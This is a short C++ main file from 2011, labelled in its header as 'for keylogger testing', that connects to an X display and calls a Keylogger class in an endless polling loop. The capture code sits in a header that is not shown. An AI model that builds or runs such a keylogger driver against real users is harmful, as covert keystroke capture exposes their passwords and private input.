//
// main.cpp for keylogger testing in /home/vianney
// 
// Made by Vianney Bouchaud
// Login   <vianney@bouchaud.org>
// 
// Started on  Wed Oct 26 13:53:06 2011 Vianney Bouchaud
// Last update Wed Oct 26 15:00:57 2011 Vianney Bouchaud
//

#include <string>
#include "Keylogger.hpp"

int main(void)
{
  Keylogger	K;

  if(K.xConnect(":0")) {
    K.start();
    while (1) {
      K.processData();
      usleep(1000000/3);
    }
  }
  return 0;
}
